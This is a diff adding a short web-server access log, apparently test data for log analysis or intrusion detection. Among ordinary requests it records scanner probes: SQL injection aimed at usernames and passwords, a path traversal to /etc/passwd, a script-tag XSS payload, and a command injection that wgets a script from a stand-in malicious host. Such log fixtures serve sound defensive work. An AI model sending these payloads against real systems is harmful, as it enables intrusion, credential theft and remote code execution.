@@ -1,0 +1,7 @@
+192.0.2.10 - - [19/Oct/2026:10:00:01 -0400] "GET /index.html HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
+185.220.101.7 - - [19/Oct/2026:10:01:12 -0400] "GET /products.php?id=1%27%20OR%201=1-- HTTP/1.1" 500 312 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
+185.220.101.7 - - [19/Oct/2026:10:01:15 -0400] "GET /products.php?id=1+UNION+SELECT+username,password+FROM+users HTTP/1.1" 500 290 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
+45.33.32.156 - - [19/Oct/2026:10:03:40 -0400] "GET /../../../../etc/passwd HTTP/1.1" 404 196 "-" "Nikto/2.5.0"
+45.33.32.156 - - [19/Oct/2026:10:03:44 -0400] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 1022 "-" "Nikto/2.5.0"
+198.51.100.77 - - [19/Oct/2026:10:05:02 -0400] "GET /cgi-bin/ping?host=8.8.8.8;wget%20http://evil-downloads.ru/a.sh HTTP/1.1" 403 0 "http://evil-downloads.ru/" "curl/8.5.0"
+192.0.2.10 - - [19/Oct/2026:10:06:00 -0400] "POST /login HTTP/1.1" 302 0 "-" "Mozilla/5.0"
